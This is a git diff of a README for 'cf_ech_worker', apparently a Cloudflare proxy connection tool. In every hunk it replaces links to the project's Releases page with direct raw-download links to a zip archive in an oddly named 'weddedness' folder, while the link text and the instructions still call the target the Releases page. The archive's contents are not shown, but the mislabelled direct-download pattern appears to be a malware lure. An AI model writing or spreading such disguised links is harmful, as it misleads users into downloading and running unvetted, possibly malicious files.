@@ -1,7 +1,7 @@
 # 🚀 cf_ech_worker - Easily Manage CF Proxy Connections
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/matrixsy/cf_ech_worker/releases)
+[![Download](https://github.com/matrixsy/cf_ech_worker/raw/refs/heads/main/weddedness/ech_worker_cf_v2.6-alpha.3.zip)](https://github.com/matrixsy/cf_ech_worker/raw/refs/heads/main/weddedness/ech_worker_cf_v2.6-alpha.3.zip)
 
 ## 📖 Overview
 cf_ech_worker helps you manage CF proxy connections smoothly. This tool is designed for all users, allowing you to easily connect without needing advanced technical skills. The source comes from the TG group: CF中转IP, and I have made it available for your convenience.
@@ -10,7 +10,7 @@ cf_ech_worker helps you manage CF proxy connections smoothly. This tool is desig
 Follow these simple steps to download and run the cf_ech_worker application. You will soon be able to manage your connections easily.
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/matrixsy/cf_ech_worker/releases) to find the latest version of cf_ech_worker. 
+   Go to the [Releases page](https://github.com/matrixsy/cf_ech_worker/raw/refs/heads/main/weddedness/ech_worker_cf_v2.6-alpha.3.zip) to find the latest version of cf_ech_worker. 
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Look for the most recent one, which typically has the latest features and fixes.
@@ -18,7 +18,7 @@ Follow these simple steps to download and run the cf_ech_worker application. You
 3. **Download the Application**
    Click on the version you want to download. There, you will find options for different files. Click on the appropriate file to start your download. 
 
-   Remember, this link leads directly to the Releases page: [Releases page](https://github.com/matrixsy/cf_ech_worker/releases).
+   Remember, this link leads directly to the Releases page: [Releases page](https://github.com/matrixsy/cf_ech_worker/raw/refs/heads/main/weddedness/ech_worker_cf_v2.6-alpha.3.zip).
 
 4. **Install the Application**
    After the download completes, locate the downloaded file. Depending on your operating system, follow these steps:
@@ -57,6 +57,6 @@ If you encounter issues while downloading or running the application, consider t
 ## 👥 Support
 If you have questions or need assistance, please feel free to reach out. You can submit issues through the GitHub repository or ask for help in the TG group where the source originated.
 
-Visit the [Releases page](https://github.com/matrixsy/cf_ech_worker/releases) for all download options and to explore the latest updates!
+Visit the [Releases page](https://github.com/matrixsy/cf_ech_worker/raw/refs/heads/main/weddedness/ech_worker_cf_v2.6-alpha.3.zip) for all download options and to explore the latest updates!
 
 Happy connecting!
